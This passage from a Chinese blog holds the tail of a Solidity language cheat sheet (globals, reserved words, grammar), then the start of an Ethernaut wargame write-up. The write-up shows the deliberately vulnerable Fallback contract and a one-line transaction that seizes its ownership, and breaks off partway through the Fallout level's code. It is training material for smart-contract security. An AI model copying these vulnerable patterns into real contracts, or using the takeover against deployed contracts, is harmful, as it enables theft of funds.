<li><code>block.number （uint）</code>：当前区块的区块号</li>
<li><code>block.timestamp （uint）</code>：当前区块的时间戳</li>
<li><code>gasleft() returns (uint256)</code>：剩余的 gas</li>
<li><code>msg.data （bytes）</code>：完整的 calldata</li>
<li><code>msg.gas （uint）</code>：剩余的 gas - 自 0.4.21 版本开始已经不推荐使用，由 gesleft() 代替</li>
<li><code>msg.sender （address）</code>：消息发送方（当前调用）</li>
<li><code>msg.value （uint）</code>：随消息发送的 wei 的数量</li>
<li><code>now （uint）</code>：当前区块的时间戳（等价于 block.timestamp）</li>
<li><code>tx.gasprice (uint)</code>：交易的 gas price</li>
<li><code>tx.origin （address）</code>：交易发送方（完整调用链上的原始发送方）</li>
<li><code>assert(bool condition)</code>：如果条件值为 false 则中止执行并回退所有状态变更（用做内部错误）</li>
<li><code>require(bool condition)</code>：如果条件值为 false 则中止执行并回退所有状态变更（用做异常输入或外部组件错误）</li>
<li><code>require(bool condition, string message)</code>：如果条件值为 false 则中止执行并回退所有状态变更（用做异常输入或外部组件错误），可以同时提供错误消息</li>
<li><code>revert()</code>：中止执行并回复所有状态变更</li>
<li><code>revert(string message)</code>：中止执行并回复所有状态变更，可以同时提供错误消息</li>
<li><code>blockhash(uint blockNumber) returns (bytes32)</code>：指定区块的区块哈希——仅可用于最新的 256 个区块</li>
<li><code>keccak256(...) returns (bytes32)</code>：计算 紧打包编码 的 Ethereum-SHA-3（Keccak-256）哈希</li>
<li><code>sha3(...) returns (bytes32)</code>：等价于 keccak256</li>
<li><code>sha256(...) returns (bytes32)</code>：计算 紧打包编码 的 SHA-256 哈希</li>
<li><code>ripemd160(...) returns (bytes20)</code>：计算 紧打包编码 的 RIPEMD-160 哈希</li>
<li><code>ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) returns (address)</code>：基于椭圆曲线签名找回与指定公钥关联的地址，发生错误的时候返回 0</li>
<li><code>addmod(uint x, uint y, uint k) returns (uint)</code>：计算 (x + y) % k 的值，其中加法的结果即使超过 2**256 也不会被截取。从 0.5.0 版本开始会加入对 k != 0 的 assert（即会在此函数开头执行 <code>assert(k != 0);</code>作为参数检查，译者注）。</li>
<li><code>mulmod(uint x, uint y, uint k) returns (uint)</code>：计算 (x * y) % k 的值，其中乘法的结果即使超过 2**256 也不会被截取。从 0.5.0 版本开始会加入对 k != 0 的 assert（即会在此函数开头执行 <code>assert(k != 0);</code>作为参数检查，译者注）。</li>
<li><code>this</code>（类型为当前合约的变量）：当前合约实例，可以准确地转换为 address</li>
<li><code>super</code>：当前合约的上一级继承关系的合约</li>
<li><code>selfdestruct(address recipient)</code>：销毁当前合约，把余额发送到给定地址</li>
<li><code>suicide(address recipient)</code>：与 selfdestruct 等价，但已不推荐使用</li>
<li><code>&lt;address&gt;.balance （uint256）</code>： 地址类型 的余额，以 Wei 为单位</li>
<li><code>&lt;address&gt;.send(uint256 amount) returns (bool)</code>：向 地址类型 发送给定数量的 Wei，失败时返回 false</li>
<li><code>&lt;address&gt;.transfer(uint256 amount)</code>：向 地址类型 发送给定数量的 Wei，失败时会把错误抛出（throw）  </li>
</ul>
<blockquote>
<p>不要用 block.timestamp、now 或者 blockhash 作为随机种子，除非你明确知道你在做什么。  </p>
<p>时间戳和区块哈希都可以在一定程度上被矿工所影响。如果你用哈希值作为随机种子，那么例如挖矿团体中的坏人就可以使用给定的哈希来执行一个赌场功能，如果他们没赢钱，他们可以简单地换一个哈希再试。  </p>
<p>当前区块的时间戳必须比前一个区块的时间戳大，但唯一可以确定的就是它会是权威链（主链或者主分支）上两个连续区块时间戳之间的一个数值。</p>
</blockquote>
<blockquote>
<p>出于扩展性的原因，你无法取得所有区块的哈希。只有最新的 256 个区块的哈希可以拿到，其他的都将为 0。</p>
</blockquote>
<ul>
<li>保留字(Reserved Keywords)  </li>
</ul>
<p>以下是 Solidity 的保留字，未来可能会变为语法的一部分：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abstract, after, alias, apply, auto, case, catch, copyof, default, define, final, immutable, implements, in, inline, let, macro, match, mutable, null, of, override, partial, promise, reference, relocatable, sealed, sizeof, static, supports, switch, try, type, typedef, typeof, unchecked.</span><br></pre></td></tr></table></figure>
<ul>
<li>语法表(Language Grammar)  </li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line">SourceUnit = (PragmaDirective | ImportDirective | ContractDefinition)*</span><br><span class="line"></span><br><span class="line">// Pragma actually parses anything up to the trailing &apos;;&apos; to be fully forward-compatible.</span><br><span class="line">PragmaDirective = &apos;pragma&apos; Identifier ([^;]+) &apos;;&apos;</span><br><span class="line"></span><br><span class="line">ImportDirective = &apos;import&apos; StringLiteral (&apos;as&apos; Identifier)? &apos;;&apos;</span><br><span class="line">        | &apos;import&apos; (&apos;*&apos; | Identifier) (&apos;as&apos; Identifier)? &apos;from&apos; StringLiteral &apos;;&apos;</span><br><span class="line">        | &apos;import&apos; &apos;&#123;&apos; Identifier (&apos;as&apos; Identifier)? ( &apos;,&apos; Identifier (&apos;as&apos; Identifier)? )* &apos;&#125;&apos; &apos;from&apos; StringLiteral &apos;;&apos;</span><br><span class="line"></span><br><span class="line">ContractDefinition = ( &apos;contract&apos; | &apos;library&apos; | &apos;interface&apos; ) Identifier</span><br><span class="line">                     ( &apos;is&apos; InheritanceSpecifier (&apos;,&apos; InheritanceSpecifier )* )?</span><br><span class="line">                     &apos;&#123;&apos; ContractPart* &apos;&#125;&apos;</span><br><span class="line"></span><br><span class="line">ContractPart = StateVariableDeclaration | UsingForDeclaration</span><br><span class="line">             | StructDefinition | ModifierDefinition | FunctionDefinition | EventDefinition | EnumDefinition</span><br><span class="line"></span><br><span class="line">InheritanceSpecifier = UserDefinedTypeName ( &apos;(&apos; Expression ( &apos;,&apos; Expression )* &apos;)&apos; )?</span><br><span class="line"></span><br><span class="line">StateVariableDeclaration = TypeName ( &apos;public&apos; | &apos;internal&apos; | &apos;private&apos; | &apos;constant&apos; )* Identifier (&apos;=&apos; Expression)? &apos;;&apos;</span><br><span class="line">UsingForDeclaration = &apos;using&apos; Identifier &apos;for&apos; (&apos;*&apos; | TypeName) &apos;;&apos;</span><br><span class="line">StructDefinition = &apos;struct&apos; Identifier &apos;&#123;&apos;</span><br><span class="line">                     ( VariableDeclaration &apos;;&apos; (VariableDeclaration &apos;;&apos;)* ) &apos;&#125;&apos;</span><br><span class="line"></span><br><span class="line">ModifierDefinition = &apos;modifier&apos; Identifier ParameterList? Block</span><br><span class="line">ModifierInvocation = Identifier ( &apos;(&apos; ExpressionList? &apos;)&apos; )?</span><br><span class="line"></span><br><span class="line">FunctionDefinition = &apos;function&apos; Identifier? ParameterList</span><br><span class="line">                     ( ModifierInvocation | StateMutability | &apos;external&apos; | &apos;public&apos; | &apos;internal&apos; | &apos;private&apos; )*</span><br><span class="line">                     ( &apos;returns&apos; ParameterList )? ( &apos;;&apos; | Block )</span><br><span class="line">EventDefinition = &apos;event&apos; Identifier EventParameterList &apos;anonymous&apos;? &apos;;&apos;</span><br><span class="line"></span><br><span class="line">EnumValue = Identifier</span><br><span class="line">EnumDefinition = &apos;enum&apos; Identifier &apos;&#123;&apos; EnumValue? (&apos;,&apos; EnumValue)* &apos;&#125;&apos;</span><br><span class="line"></span><br><span class="line">ParameterList = &apos;(&apos; ( Parameter (&apos;,&apos; Parameter)* )? &apos;)&apos;</span><br><span class="line">Parameter = TypeName StorageLocation? Identifier?</span><br><span class="line"></span><br><span class="line">EventParameterList = &apos;(&apos; ( EventParameter (&apos;,&apos; EventParameter )* )? &apos;)&apos;</span><br><span class="line">EventParameter = TypeName &apos;indexed&apos;? Identifier?</span><br><span class="line"></span><br><span class="line">FunctionTypeParameterList = &apos;(&apos; ( FunctionTypeParameter (&apos;,&apos; FunctionTypeParameter )* )? &apos;)&apos;</span><br><span class="line">FunctionTypeParameter = TypeName StorageLocation?</span><br><span class="line"></span><br><span class="line">// semantic restriction: mappings and structs (recursively) containing mappings</span><br><span class="line">// are not allowed in argument lists</span><br><span class="line">VariableDeclaration = TypeName StorageLocation? Identifier</span><br><span class="line"></span><br><span class="line">TypeName = ElementaryTypeName</span><br><span class="line">         | UserDefinedTypeName</span><br><span class="line">         | Mapping</span><br><span class="line">         | ArrayTypeName</span><br><span class="line">         | FunctionTypeName</span><br><span class="line">         | ( &apos;address&apos; &apos;payable&apos; )</span><br><span class="line"></span><br><span class="line">UserDefinedTypeName = Identifier ( &apos;.&apos; Identifier )*</span><br><span class="line"></span><br><span class="line">Mapping = &apos;mapping&apos; &apos;(&apos; ElementaryTypeName &apos;=&gt;&apos; TypeName &apos;)&apos;</span><br><span class="line">ArrayTypeName = TypeName &apos;[&apos; Expression? &apos;]&apos;</span><br><span class="line">FunctionTypeName = &apos;function&apos; FunctionTypeParameterList ( &apos;internal&apos; | &apos;external&apos; | StateMutability )*</span><br><span class="line">                   ( &apos;returns&apos; FunctionTypeParameterList )?</span><br><span class="line">StorageLocation = &apos;memory&apos; | &apos;storage&apos; | &apos;calldata&apos;</span><br><span class="line">StateMutability = &apos;pure&apos; | &apos;view&apos; | &apos;payable&apos;</span><br><span class="line"></span><br><span class="line">Block = &apos;&#123;&apos; Statement* &apos;&#125;&apos;</span><br><span class="line">Statement = IfStatement | WhileStatement | ForStatement | Block | InlineAssemblyStatement |</span><br><span class="line">            ( DoWhileStatement | PlaceholderStatement | Continue | Break | Return |</span><br><span class="line">              Throw | EmitStatement | SimpleStatement ) &apos;;&apos;</span><br><span class="line"></span><br><span class="line">ExpressionStatement = Expression</span><br><span class="line">IfStatement = &apos;if&apos; &apos;(&apos; Expression &apos;)&apos; Statement ( &apos;else&apos; Statement )?</span><br><span class="line">WhileStatement = &apos;while&apos; &apos;(&apos; Expression &apos;)&apos; Statement</span><br><span class="line">PlaceholderStatement = &apos;_&apos;</span><br><span class="line">SimpleStatement = VariableDefinition | ExpressionStatement</span><br><span class="line">ForStatement = &apos;for&apos; &apos;(&apos; (SimpleStatement)? &apos;;&apos; (Expression)? &apos;;&apos; (ExpressionStatement)? &apos;)&apos; Statement</span><br><span class="line">InlineAssemblyStatement = &apos;assembly&apos; StringLiteral? AssemblyBlock</span><br><span class="line">DoWhileStatement = &apos;do&apos; Statement &apos;while&apos; &apos;(&apos; Expression &apos;)&apos;</span><br><span class="line">Continue = &apos;continue&apos;</span><br><span class="line">Break = &apos;break&apos;</span><br><span class="line">Return = &apos;return&apos; Expression?</span><br><span class="line">Throw = &apos;throw&apos;</span><br><span class="line">EmitStatement = &apos;emit&apos; FunctionCall</span><br><span class="line">VariableDefinition = (VariableDeclaration | &apos;(&apos; VariableDeclaration? (&apos;,&apos; VariableDeclaration? )* &apos;)&apos; ) ( &apos;=&apos; Expression )?</span><br><span class="line"></span><br><span class="line">// Precedence by order (see github.com/ethereum/solidity/pull/732)</span><br><span class="line">Expression</span><br><span class="line">  = Expression (&apos;++&apos; | &apos;--&apos;)</span><br><span class="line">  | NewExpression</span><br><span class="line">  | IndexAccess</span><br><span class="line">  | MemberAccess</span><br><span class="line">  | FunctionCall</span><br><span class="line">  | &apos;(&apos; Expression &apos;)&apos;</span><br><span class="line">  | (&apos;!&apos; | &apos;~&apos; | &apos;delete&apos; | &apos;++&apos; | &apos;--&apos; | &apos;+&apos; | &apos;-&apos;) Expression</span><br><span class="line">  | Expression &apos;**&apos; Expression</span><br><span class="line">  | Expression (&apos;*&apos; | &apos;/&apos; | &apos;%&apos;) Expression</span><br><span class="line">  | Expression (&apos;+&apos; | &apos;-&apos;) Expression</span><br><span class="line">  | Expression (&apos;&lt;&lt;&apos; | &apos;&gt;&gt;&apos;) Expression</span><br><span class="line">  | Expression &apos;&amp;&apos; Expression</span><br><span class="line">  | Expression &apos;^&apos; Expression</span><br><span class="line">  | Expression &apos;|&apos; Expression</span><br><span class="line">  | Expression (&apos;&lt;&apos; | &apos;&gt;&apos; | &apos;&lt;=&apos; | &apos;&gt;=&apos;) Expression</span><br><span class="line">  | Expression (&apos;==&apos; | &apos;!=&apos;) Expression</span><br><span class="line">  | Expression &apos;&amp;&amp;&apos; Expression</span><br><span class="line">  | Expression &apos;||&apos; Expression</span><br><span class="line">  | Expression &apos;?&apos; Expression &apos;:&apos; Expression</span><br><span class="line">  | Expression (&apos;=&apos; | &apos;|=&apos; | &apos;^=&apos; | &apos;&amp;=&apos; | &apos;&lt;&lt;=&apos; | &apos;&gt;&gt;=&apos; | &apos;+=&apos; | &apos;-=&apos; | &apos;*=&apos; | &apos;/=&apos; | &apos;%=&apos;) Expression</span><br><span class="line">  | PrimaryExpression</span><br><span class="line"></span><br><span class="line">PrimaryExpression = BooleanLiteral</span><br><span class="line">                  | NumberLiteral</span><br><span class="line">                  | HexLiteral</span><br><span class="line">                  | StringLiteral</span><br><span class="line">                  | TupleExpression</span><br><span class="line">                  | Identifier</span><br><span class="line">                  | ElementaryTypeNameExpression</span><br><span class="line"></span><br><span class="line">ExpressionList = Expression ( &apos;,&apos; Expression )*</span><br><span class="line">NameValueList = Identifier &apos;:&apos; Expression ( &apos;,&apos; Identifier &apos;:&apos; Expression )*</span><br><span class="line"></span><br><span class="line">FunctionCall = Expression &apos;(&apos; FunctionCallArguments &apos;)&apos;</span><br><span class="line">FunctionCallArguments = &apos;&#123;&apos; NameValueList? &apos;&#125;&apos;</span><br><span class="line">                      | ExpressionList?</span><br><span class="line"></span><br><span class="line">NewExpression = &apos;new&apos; TypeName</span><br><span class="line">MemberAccess = Expression &apos;.&apos; Identifier</span><br><span class="line">IndexAccess = Expression &apos;[&apos; Expression? &apos;]&apos;</span><br><span class="line"></span><br><span class="line">BooleanLiteral = &apos;true&apos; | &apos;false&apos;</span><br><span class="line">NumberLiteral = ( HexNumber | DecimalNumber ) (&apos; &apos; NumberUnit)?</span><br><span class="line">NumberUnit = &apos;wei&apos; | &apos;szabo&apos; | &apos;finney&apos; | &apos;ether&apos;</span><br><span class="line">           | &apos;seconds&apos; | &apos;minutes&apos; | &apos;hours&apos; | &apos;days&apos; | &apos;weeks&apos; | &apos;years&apos;</span><br><span class="line">HexLiteral = &apos;hex&apos; (&apos;&quot;&apos; ([0-9a-fA-F]&#123;2&#125;)* &apos;&quot;&apos; | &apos;\&apos;&apos; ([0-9a-fA-F]&#123;2&#125;)* &apos;\&apos;&apos;)</span><br><span class="line">StringLiteral = &apos;&quot;&apos; ([^&quot;\r\n\\] | &apos;\\&apos; .)* &apos;&quot;&apos;</span><br><span class="line">Identifier = [a-zA-Z_$] [a-zA-Z_$0-9]*</span><br><span class="line"></span><br><span class="line">HexNumber = &apos;0x&apos; [0-9a-fA-F]+</span><br><span class="line">DecimalNumber = [0-9]+ ( &apos;.&apos; [0-9]* )? ( [eE] [0-9]+ )?</span><br><span class="line"></span><br><span class="line">TupleExpression = &apos;(&apos; ( Expression? ( &apos;,&apos; Expression? )*  )? &apos;)&apos;</span><br><span class="line">                | &apos;[&apos; ( Expression  ( &apos;,&apos; Expression  )*  )? &apos;]&apos;</span><br><span class="line"></span><br><span class="line">ElementaryTypeNameExpression = ElementaryTypeName</span><br><span class="line"></span><br><span class="line">ElementaryTypeName = &apos;address&apos; | &apos;bool&apos; | &apos;string&apos; | Int | Uint | Byte | Fixed | Ufixed</span><br><span class="line"></span><br><span class="line">Int = &apos;int&apos; | &apos;int8&apos; | &apos;int16&apos; | &apos;int24&apos; | &apos;int32&apos; | &apos;int40&apos; | &apos;int48&apos; | &apos;int56&apos; | &apos;int64&apos; | &apos;int72&apos; | &apos;int80&apos; | &apos;int88&apos; | &apos;int96&apos; | &apos;int104&apos; | &apos;int112&apos; | &apos;int120&apos; | &apos;int128&apos; | &apos;int136&apos; | &apos;int144&apos; | &apos;int152&apos; | &apos;int160&apos; | &apos;int168&apos; | &apos;int176&apos; | &apos;int184&apos; | &apos;int192&apos; | &apos;int200&apos; | &apos;int208&apos; | &apos;int216&apos; | &apos;int224&apos; | &apos;int232&apos; | &apos;int240&apos; | &apos;int248&apos; | &apos;int256&apos;</span><br><span class="line"></span><br><span class="line">Uint = &apos;uint&apos; | &apos;uint8&apos; | &apos;uint16&apos; | &apos;uint24&apos; | &apos;uint32&apos; | &apos;uint40&apos; | &apos;uint48&apos; | &apos;uint56&apos; | &apos;uint64&apos; | &apos;uint72&apos; | &apos;uint80&apos; | &apos;uint88&apos; | &apos;uint96&apos; | &apos;uint104&apos; | &apos;uint112&apos; | &apos;uint120&apos; | &apos;uint128&apos; | &apos;uint136&apos; | &apos;uint144&apos; | &apos;uint152&apos; | &apos;uint160&apos; | &apos;uint168&apos; | &apos;uint176&apos; | &apos;uint184&apos; | &apos;uint192&apos; | &apos;uint200&apos; | &apos;uint208&apos; | &apos;uint216&apos; | &apos;uint224&apos; | &apos;uint232&apos; | &apos;uint240&apos; | &apos;uint248&apos; | &apos;uint256&apos;</span><br><span class="line"></span><br><span class="line">Byte = &apos;byte&apos; | &apos;bytes&apos; | &apos;bytes1&apos; | &apos;bytes2&apos; | &apos;bytes3&apos; | &apos;bytes4&apos; | &apos;bytes5&apos; | &apos;bytes6&apos; | &apos;bytes7&apos; | &apos;bytes8&apos; | &apos;bytes9&apos; | &apos;bytes10&apos; | &apos;bytes11&apos; | &apos;bytes12&apos; | &apos;bytes13&apos; | &apos;bytes14&apos; | &apos;bytes15&apos; | &apos;bytes16&apos; | &apos;bytes17&apos; | &apos;bytes18&apos; | &apos;bytes19&apos; | &apos;bytes20&apos; | &apos;bytes21&apos; | &apos;bytes22&apos; | &apos;bytes23&apos; | &apos;bytes24&apos; | &apos;bytes25&apos; | &apos;bytes26&apos; | &apos;bytes27&apos; | &apos;bytes28&apos; | &apos;bytes29&apos; | &apos;bytes30&apos; | &apos;bytes31&apos; | &apos;bytes32&apos;</span><br><span class="line"></span><br><span class="line">Fixed = &apos;fixed&apos; | ( &apos;fixed&apos; [0-9]+ &apos;x&apos; [0-9]+ )</span><br><span class="line"></span><br><span class="line">Ufixed = &apos;ufixed&apos; | ( &apos;ufixed&apos; [0-9]+ &apos;x&apos; [0-9]+ )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AssemblyBlock = &apos;&#123;&apos; AssemblyStatement* &apos;&#125;&apos;</span><br><span class="line"></span><br><span class="line">AssemblyStatement = AssemblyBlock</span><br><span class="line">                  | AssemblyFunctionDefinition</span><br><span class="line">                  | AssemblyVariableDeclaration</span><br><span class="line">                  | AssemblyAssignment</span><br><span class="line">                  | AssemblyIf</span><br><span class="line">                  | AssemblyExpression</span><br><span class="line">                  | AssemblySwitch</span><br><span class="line">                  | AssemblyForLoop</span><br><span class="line">                  | AssemblyBreakContinue</span><br><span class="line">AssemblyFunctionDefinition =</span><br><span class="line">    &apos;function&apos; Identifier &apos;(&apos; AssemblyIdentifierList? &apos;)&apos;</span><br><span class="line">    ( &apos;-&gt;&apos; AssemblyIdentifierList )? AssemblyBlock</span><br><span class="line">AssemblyVariableDeclaration = &apos;let&apos; AssemblyIdentifierList ( &apos;:=&apos; AssemblyExpression )?</span><br><span class="line">AssemblyAssignment = AssemblyIdentifierList &apos;:=&apos; AssemblyExpression</span><br><span class="line">AssemblyExpression = AssemblyFunctionCall | Identifier | Literal</span><br><span class="line">AssemblyIf = &apos;if&apos; AssemblyExpression AssemblyBlock</span><br><span class="line">AssemblySwitch = &apos;switch&apos; AssemblyExpression ( Case+ AssemblyDefault? | AssemblyDefault )</span><br><span class="line">AssemblyCase = &apos;case&apos; Literal AssemblyBlock</span><br><span class="line">AssemblyDefault = &apos;default&apos; AssemblyBlock</span><br><span class="line">AssemblyForLoop = &apos;for&apos; AssemblyBlock AssemblyExpression AssemblyBlock AssemblyBlock</span><br><span class="line">AssemblyBreakContinue = &apos;break&apos; | &apos;continue&apos;</span><br><span class="line">AssemblyFunctionCall = Identifier &apos;(&apos; ( AssemblyExpression ( &apos;,&apos; AssemblyExpression )* )? &apos;)&apos;</span><br><span class="line"></span><br><span class="line">AssemblyIdentifierList = Identifier ( &apos;,&apos; Identifier )*</span><br></pre></td></tr></table></figure>

        
      
    
    </div>
    
  </article>
  
  
    
  

  
    
  


  <article class="
  post
  
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInUpShort back-1">
        <div class="post-time-wrapper">
          <span>2019-03-26</span>
          
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInUpShort back-2">
        
          <a href="/2019/03/26/Ethernaut-writeUp/">Ethernaut WriteUp</a>
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInUpShort back-3">
      
        
          <h3 id="很好玩的合约游戏"><a href="#很好玩的合约游戏" class="headerlink" title="很好玩的合约游戏"></a>很好玩的合约游戏</h3><hr>
<h4 id="1-Fallback"><a href="#1-Fallback" class="headerlink" title="1. Fallback"></a>1. Fallback</h4><blockquote>
<p><strong>Target</strong>: claim ownership of the contract  </p>
</blockquote>
<p>&emsp;&emsp;这道题是考察<strong>fallback</strong>函数的奇妙(sb)用法，他的目的应该是处理异常用的，但是效果其实有点鸡肋…</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'zeppelin-solidity/contracts/ownership/Ownable.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract Fallback is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public contributions;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Fallback</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    contributions[msg.sender] = <span class="number">1000</span> * (<span class="number">1</span> ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">contribute</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.value &lt; <span class="number">0.001</span> ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    <span class="keyword">if</span>(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getContribution</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">onlyOwner</span> </span>&#123;</span><br><span class="line">    owner.transfer(<span class="keyword">this</span>.balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">payable</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.value &gt; <span class="number">0</span> &amp;&amp; contributions[msg.sender] &gt; <span class="number">0</span>);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;在这里，我们只需要 <strong>我 秦始皇 打钱</strong> 就可以实现fallback()的调用：  </p>
<blockquote>
<p>contract.sendTransaction({value:1});  </p>
</blockquote>
<p>&emsp;&emsp;智能合约的梗是真他喵的多 哈哈哈哈哈</p>
<hr>
<h4 id="2-Fallout"><a href="#2-Fallout" class="headerlink" title="2. Fallout"></a>2. Fallout</h4><blockquote>
<p><strong>Target</strong>: Claim ownership of the contract  </p>
</blockquote>
<p>&emsp;&emsp;这道题的出题人是真的欠揍，马德，完全是考眼力：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'zeppelin-solidity/contracts/ownership/Ownable.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract Fallout is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  mapping (<span class="function"><span 